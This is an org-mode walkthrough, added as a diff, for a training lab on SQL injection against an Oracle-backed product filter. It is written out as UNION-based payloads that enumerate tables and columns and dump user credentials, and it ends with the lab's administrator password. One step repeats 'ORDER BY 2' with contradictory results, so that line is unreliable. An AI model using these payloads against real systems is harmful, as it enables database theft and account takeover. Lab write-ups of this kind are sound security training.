@@ -1,1 +1,85 @@
 #+title: SQL injection attack, listing the database contents on Oracle
+#+author: [[https://github.com/touhidulshawan][Touhidul Shawan]] 
+#+description: Mindmap to solve the lab with steps and solution
+#+OPTIONS: toc:2
+
+* Table of Contents :toc:
+- [[#lab-contain][Lab contain]]
+- [[#goal][Goal]]
+- [[#find-out-number-of-column-orginal-query-return][Find out number of column orginal query return]]
+- [[#find-out-the-data-type-of-returned-column][Find out the data type of returned column]]
+- [[#check-out-database-version][Check out database version]]
+- [[#find-out-the-table-name-that-contains-all-usernames-and-passwords][Find out the table name that contains all usernames and passwords]]
+- [[#find-out-the-column-name-that-contains-all-usernames-and-passwords][Find out the column name that contains all usernames and passwords]]
+- [[#finally-retreive-all-the-data][Finally retreive all the data]]
+
+* Lab contain
+- SQL injection vulnerability in product ~category~ filter
+- Login panel
+* Goal
+- Find out name of the table that contains ~usernames~  and ~passwords~ of all users
+- Login as ~administrator~
+
+* DONE Find out number of column orginal query return
+#+begin_src sql
+ ' ORDER BY 1 --
+#+end_src
+/return 200/
+
+#+begin_src sql
+ ' ORDER BY 2 --
+#+end_src
+/return 200/
+
+#+begin_src sql
+ ' ORDER BY 2 --
+#+end_src
+/return 500 - Internal Server Error/
+
+*So number of column is 2*
+
+* DONE Find out the data type of returned column
+*Have to select one table name ex: ~dual~ since it is oracle database*
+#+begin_src sql
+ ' UNION SELECT 'AB', NULL FROM dual --
+#+end_src
+/return 200, so first column ~string~ type/
+#+begin_src sql
+ ' UNION SELECT 'AB', 'zz' FROM dual --
+#+end_src
+/return 200, so second column ~string~ type/
+
+* DONE Check out database version 
+No need to find out the database version since it is already mentioned on question it is using ~oracle~ database.
+* DONE Find out the table name that contains all usernames and passwords
+#+begin_src sql
+ ' UNION SELECT table_name, NULL FROM all_tables --
+#+end_src
+/200 res: return all table name/
+
+From all of them this is the interesting table name ~USERS_UVWUNC~ [can be changes on every new instance of lab]. It may contain all the usernames and passwords informations of all users.
+
+* DONE Find out the column name that contains all usernames and passwords
+Now determine the columns name of ~USERS_UVWUNC~ table
+#+begin_src sql 
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_UVWUNC' --
+#+end_src
+/return 200:OK/, return the columns name that ~USERS_UVWUNC~ table contain
+
++ Columns Name
+- ~USERNAME_ENTEPR~
+- ~PASSWORD_EKRVGE~
+
+* DONE Finally retreive all the data  
+#+begin_src sql
+' UNION SELECT USERNAME_ENTEPR, PASSWORD_EKRVGE FROM USERS_UVWUNC --
+#+end_src
+/return 200:Ok/
+
+This query return all the usernames and passwords 
+
+*** Finish the Lab
+Now retreive the username and passwords of the administrator and login into the system to solve the lab
++ username: ~administrator~
++ password: ~vrscwhqivcaf506k3618~
+[can be change on every new instance of the lab]
